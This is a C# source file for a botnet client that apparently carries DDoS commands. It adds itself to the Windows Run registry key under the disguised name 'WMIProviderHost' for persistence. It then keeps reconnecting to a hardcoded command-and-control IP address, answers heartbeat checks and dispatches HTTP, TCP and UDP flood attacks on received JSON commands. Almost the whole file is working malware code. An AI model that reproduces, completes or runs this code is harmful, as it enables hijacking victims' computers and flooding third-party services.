using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using Venusos_Botnet_Client;

try
{
    Microsoft.Win32.RegistryKey key;
    key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
    key.SetValue("WMIProviderHost", Path.Combine(Environment.CurrentDirectory, System.Reflection.Assembly.GetExecutingAssembly().GetName().Name));
    key.Close();
}
catch (Exception)
{

}

while (true)
{
    try
    {
        TcpClient tcpClient = new TcpClient("18.134.47.108", 1000);
        NetworkStream networkStream = tcpClient.GetStream();

        int i = 0;
        string data = "";
        byte[] bytes = new byte[256];

        while ((i = networkStream.Read(bytes)) != 0)
        {
            data = Encoding.ASCII.GetString(bytes, 0, i);

            if (data == "Are you alive?")
            {
                networkStream.Write(Encoding.ASCII.GetBytes("I am alive!"), 0, 11);
            }
            else
            {
                Command command = JsonSerializer.Deserialize<Command>(data);
                Attack attack = new Attack(command);

                switch (command.Method)
                {
                    case "http":
                        attack.Http();
                        break;
                    case "tcp":
                        attack.Tcp();
                        break;
                    case "udp":
                        attack.Udp();
                        break;
                }
            }
        }
    }
    catch (Exception)
    {

    }
}